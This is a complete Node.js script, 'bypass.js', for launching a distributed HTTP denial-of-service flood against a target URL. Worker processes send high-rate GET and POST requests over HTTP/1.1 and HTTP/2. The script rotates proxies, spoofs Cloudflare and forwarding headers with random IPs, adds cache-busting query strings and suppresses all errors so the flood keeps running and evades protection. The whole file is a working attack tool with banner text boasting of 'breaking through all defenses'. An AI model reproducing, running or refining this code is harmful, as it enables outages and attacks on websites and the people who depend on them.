const cluster = require('cluster');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const crypto = require('crypto');
const url = require('url');
const fs = require('fs');

// Enhanced error suppression
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 5) {
    console.log('Usage: node bypass.js <target> <time> <threads> <proxy_file> <rate> <mode>');
    process.exit(1);
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const proxyFile = process.argv[5] || 'PROXY.txt';
const rate = parseInt(process.argv[6]) || 100;
const mode = process.argv[7] || 'normal';

console.log(`
🔓🔓🔓 CLOUDFLARE BYPASS ATTACK INITIATED 🔓🔓🔓
🎯 Target: ${target}
⏱ Duration: ${time}s
🧵 Threads: ${threads}
📊 Rate: ${rate}/s per thread
🛡️ Mode: ${mode.toUpperCase()} BYPASS
🚀 BREAKING THROUGH ALL DEFENSES!
`);

const targetUrl = url.parse(target);

// CloudFlare bypass user agents
const cfBypassUA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'curl/7.68.0',
    'Wget/1.20.3 (linux-gnu)'
];

// Load proxies
let proxies = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf8');
    proxies = proxyData.split('\n').filter(line => line.trim());
    console.log(`📋 Loaded ${proxies.length} proxies for bypass attack`);
} catch (error) {
    console.log('⚠️ Running direct bypass attack');
    proxies = ['direct'];
}

function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

function randomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

if (cluster.isMaster) {
    console.log(`🚀 Starting ${threads} CloudFlare bypass threads...`);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`[Bypass Thread ${i + 1}] CloudFlare bypass started`);
    }

    setTimeout(() => {
        console.log('⏰ CloudFlare bypass attack completed!');
        process.exit(0);
    }, time * 1000);

} else {
    startBypassAttack();
}

function startBypassAttack() {
    // Multiple bypass methods running simultaneously
    setInterval(() => {
        for (let i = 0; i < rate; i++) {
            setTimeout(() => {
                // Use all bypass methods
                cloudflareBypass();
                directHttpsBypass();
                http2Bypass();
                headerSpoofBypass();
            }, i * 10);
        }
    }, 1000);
}

function cloudflareBypass() {
    const fakeIP = generateRandomIP();
    const userAgent = cfBypassUA[Math.floor(Math.random() * cfBypassUA.length)];

    const options = {
        hostname: targetUrl.hostname,
        port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
        path: `${targetUrl.path}?cf_bypass=${randomString(12)}&rand=${Date.now()}`,
        method: 'GET',
        headers: {
            'User-Agent': userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'CF-Connecting-IP': fakeIP,
            'CF-IPCountry': 'US',
            'CF-RAY': randomString(16),
            'CF-Visitor': '{"scheme":"https"}',
            'X-Forwarded-For': fakeIP,
            'X-Real-IP': fakeIP,
            'X-Forwarded-Proto': 'https',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        },
        timeout: 5000
    };

    const client = targetUrl.protocol === 'https:' ? https : http;

    const req = client.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    });

    req.on('error', () => {});
    req.on('timeout', () => req.destroy());
    req.end();
}

function directHttpsBypass() {
    const fakeIP = generateRandomIP();

    const options = {
        hostname: targetUrl.hostname,
        port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
        path: `${targetUrl.path}?direct=${randomString(10)}&time=${Date.now()}`,
        method: Math.random() > 0.5 ? 'GET' : 'POST',
        headers: {
            'Host': targetUrl.hostname,
            'User-Agent': cfBypassUA[Math.floor(Math.random() * cfBypassUA.length)],
            'Accept': '*/*',
            'X-Forwarded-For': fakeIP,
            'X-Real-IP': fakeIP,
            'Client-IP': fakeIP,
            'X-Cluster-Client-IP': fakeIP,
            'X-Remote-IP': fakeIP,
            'X-Remote-Addr': fakeIP,
            'X-ProxyUser-Ip': fakeIP,
            'X-Originating-URL': targetUrl.path,
            'X-Rewrite-URL': targetUrl.path,
            'X-Originating-IP': fakeIP,
            'X-Forwarded-Host': targetUrl.hostname,
            'X-Forwarded-Server': targetUrl.hostname
        },
        rejectUnauthorized: false,
        timeout: 5000
    };

    const client = targetUrl.protocol === 'https:' ? https : http;

    const req = client.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    });

    req.on('error', () => {});
    req.on('timeout', () => req.destroy());

    if (options.method === 'POST') {
        req.write(crypto.randomBytes(1024));
    }

    req.end();
}

function http2Bypass() {
    try {
        const client = http2.connect(target, {
            rejectUnauthorized: false
        });

        const fakeIP = generateRandomIP();

        const headers = {
            ':method': 'GET',
            ':path': `${targetUrl.path}?http2_bypass=${randomString(15)}&t=${Date.now()}`,
            ':authority': targetUrl.hostname,
            'user-agent': cfBypassUA[Math.floor(Math.random() * cfBypassUA.length)],
            'accept': '*/*',
            'cf-connecting-ip': fakeIP,
            'x-forwarded-for': fakeIP,
            'x-real-ip': fakeIP,
            'x-forwarded-proto': 'https'
        };

        for (let i = 0; i < 5; i++) {
            const req = client.request(headers);
            req.on('response', () => req.close());
            req.on('error', () => {});
            req.end();
        }

        setTimeout(() => {
            try { client.close(); } catch (e) {}
        }, 3000);

    } catch (error) {
        // Fallback to HTTP/1.1
        directHttpsBypass();
    }
}

function headerSpoofBypass() {
    const spoofHeaders = [
        'X-Originating-IP', 'X-Forwarded-For', 'X-Remote-IP', 'X-Remote-Addr',
        'X-Client-IP', 'X-Real-IP', 'X-Forwarded', 'X-Cluster-Client-IP',
        'Client-IP', 'True-Client-IP', 'CF-Connecting-IP'
    ];

    const options = {
        hostname: targetUrl.hostname,
        port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
        path: `${targetUrl.path}?spoof=${randomString(12)}`,
        method: 'GET',
        headers: {
            'User-Agent': cfBypassUA[Math.floor(Math.random() * cfBypassUA.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        },
        rejectUnauthorized: false,
        timeout: 5000
    };

    // Add multiple spoofed headers
    spoofHeaders.forEach(header => {
        options.headers[header] = generateRandomIP();
    });

    const client = targetUrl.protocol === 'https:' ? https : http;

    const req = client.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    });

    req.on('error', () => {});
    req.on('timeout', () => req.destroy());
    req.end();
}
